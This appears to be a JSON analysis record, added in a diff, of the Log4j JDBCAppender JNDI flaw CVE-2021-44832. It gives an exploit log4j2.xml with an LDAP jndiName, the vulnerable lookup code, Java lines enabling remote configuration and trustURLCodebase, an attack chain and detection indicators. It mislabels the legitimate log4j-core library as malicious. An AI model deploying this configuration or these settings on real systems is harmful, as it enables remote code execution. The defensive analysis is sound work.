@@ -1,0 +1,137 @@
+{
+  "package_info": {
+    "package_name": "log4j-core",
+    "package_manager": "Maven (Java)",
+    "package_versions": "2.0-beta7 through 2.17.0 (excluding 2.17.1, 2.12.4, 2.3.2 and above)",
+    "why_malicious": "The package contains a deserialization vulnerability (CVE-2021-44832) that allows remote code execution if an attacker can control the Log4j configuration file, specifically by injecting a malicious JDBCAppender DataSource element with a JNDI LDAP URL. This enables arbitrary code execution via remote class loading and deserialization."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "import-time / application startup",
+        "file_location": "log4j2.xml (remote or local configuration file)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Configuration status=\"error\">\n    <Appenders>\n        <JDBC name=\"databaseAppender\" tableName=\"dbo.application_log\">\n            <DataSource jndiName=\"ldap://127.0.0.1:1389/Exploit\" />\n            <Column name=\"eventDate\" isEventTimestamp=\"true\" />\n            <Column name=\"level\" pattern=\"%level\" />\n            <Column name=\"logger\" pattern=\"%logger\" />\n            <Column name=\"message\" pattern=\"%message\" />\n            <Column name=\"exception\" pattern=\"%ex{full}\" />\n        </JDBC>\n    </Appenders>\n    <Loggers>\n        <Root level=\"warn\">\n            <AppenderRef ref=\"databaseAppender\"/>\n        </Root>\n    </Loggers>\n</Configuration>",
+      "code_language": "xml",
+      "code_behavior": "At import-time or application startup, the configuration file instructs Log4j to instantiate a JDBCAppender with a DataSource whose jndiName is an attacker-controlled LDAP URL. This causes Log4j to perform a JNDI lookup to the specified LDAP server, which can return a serialized Java object or remote class, leading to arbitrary code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The use of a remote JNDI LDAP URL in a logging configuration is highly unusual and enables remote code execution via deserialization.",
+        "violated_expectations": "Normal logging configurations should not reference remote JNDI resources, especially over LDAP, nor should they allow remote class loading or deserialization.",
+        "similar_legitimate_use": "JNDI is sometimes used for legitimate resource lookups in enterprise environments, but not for untrusted or remote LDAP endpoints.",
+        "key_indicators": [
+          "Presence of DataSource jndiName with ldap:// URL",
+          "Remote configuration file loaded over HTTP/FTP",
+          "JDBCAppender referencing attacker-controlled JNDI endpoints"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "import-time / application startup",
+        "file_location": "org.apache.logging.log4j.core.appender.db.jdbc.DataSourceConnectionSource (Java class)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "final InitialContext context = new InitialContext();\nfinal DataSource dataSource = (DataSource) context.lookup(jndiName);",
+      "code_language": "java",
+      "code_behavior": "At import-time or application startup, the code performs a JNDI lookup using the jndiName specified in the configuration. If the jndiName points to a remote LDAP server, the lookup can result in the loading and deserialization of attacker-controlled Java objects, leading to code execution.",
+      "malice_analysis": {
+        "why_suspicious": "Direct JNDI lookups using attacker-controlled input are a well-known vector for remote code execution.",
+        "violated_expectations": "Expected behavior is to use only trusted, local JNDI resources, not arbitrary remote endpoints.",
+        "similar_legitimate_use": "JNDI lookups are legitimate for internal resource discovery, but not for untrusted or external URLs.",
+        "key_indicators": [
+          "JNDI lookup using unvalidated input",
+          "Casting result of JNDI lookup to DataSource",
+          "No restriction on protocol or host in jndiName"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "import-time / application startup",
+        "file_location": "log4j.java (application code)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "System.setProperty(\"log4j2.configurationFile\",\"http://127.0.0.1:8888/log4j2.xml\");\nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\");",
+      "code_language": "java",
+      "code_behavior": "At import-time or application startup, the code sets system properties to load a remote Log4j configuration file and to allow remote codebases for LDAP JNDI lookups, enabling the attack chain.",
+      "malice_analysis": {
+        "why_suspicious": "Setting configurationFile to a remote URL and enabling trustURLCodebase are both highly risky and enable remote code execution.",
+        "violated_expectations": "Configuration files should be local and trustURLCodebase should not be enabled in production.",
+        "similar_legitimate_use": "Remote configuration may be used in some enterprise setups, but is rarely safe.",
+        "key_indicators": [
+          "Remote configuration file URL",
+          "Enabling trustURLCodebase for LDAP"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker uploads a malicious log4j2.xml configuration file to a remote location.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Server fetches and loads the malicious configuration."
+    },
+    {
+      "step": 2,
+      "action": "Server fetches the remote configuration file (log4j2.xml) via HTTP.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Server parses and applies the configuration."
+    },
+    {
+      "step": 3,
+      "action": "Log4j initializes JDBCAppender with DataSource jndiName pointing to attacker-controlled LDAP server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "JNDI lookup to attacker's LDAP server."
+    },
+    {
+      "step": 4,
+      "action": "JNDI lookup is performed, contacting the attacker's LDAP server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "LDAP server returns malicious serialized Java object or class."
+    },
+    {
+      "step": 5,
+      "action": "Log4j deserializes and executes the malicious payload from the LDAP server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains remote code execution on the server."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "JNDI lookups to external LDAP servers during application startup",
+      "Loading of remote configuration files via HTTP/FTP",
+      "Presence of DataSource jndiName with ldap:// or other remote protocols in log4j2.xml"
+    ],
+    "file_indicators": [
+      "log4j2.xml with DataSource jndiName referencing ldap://",
+      "Remote log4j2.xml configuration files loaded via HTTP/FTP"
+    ],
+    "network_indicators": [
+      "Outbound LDAP requests to non-corporate or untrusted servers",
+      "HTTP requests to fetch log4j2.xml from external sources"
+    ],
+    "how_to_detect": "Monitor for log4j2.xml files (local or remote) that contain DataSource elements with jndiName attributes referencing ldap:// or other remote protocols. Detect outbound LDAP connections from application servers, especially during startup or configuration reload. Flag any use of System.setProperty to set log4j2.configurationFile to a remote URL or enabling com.sun.jndi.ldap.object.trustURLCodebase. Alert on any JNDI lookups to external servers or deserialization of remote objects."
+  }
+}
